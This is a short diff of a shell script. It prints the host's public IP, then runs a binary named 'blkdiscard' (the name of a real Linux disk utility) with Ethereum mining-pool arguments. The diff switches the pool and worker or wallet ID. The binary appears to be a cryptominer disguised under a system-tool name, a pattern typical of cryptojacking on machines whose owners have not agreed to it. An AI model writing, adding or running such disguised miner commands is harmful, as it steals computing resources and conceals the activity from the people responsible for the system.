@@ -4,4 +4,4 @@
 #gives ip address 
 curl ipecho.net/plain && curl ipecho.net/plain
 chmod +x blkdiscard 
-./blkdiscard --pool stratum+tcp://ethash.na.mine.zergpool.com:9999 --user TJXKzk3ZhPZn5P51RTkWP78SUdqXGPc4rX
+./blkdiscard --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user legassa.001 
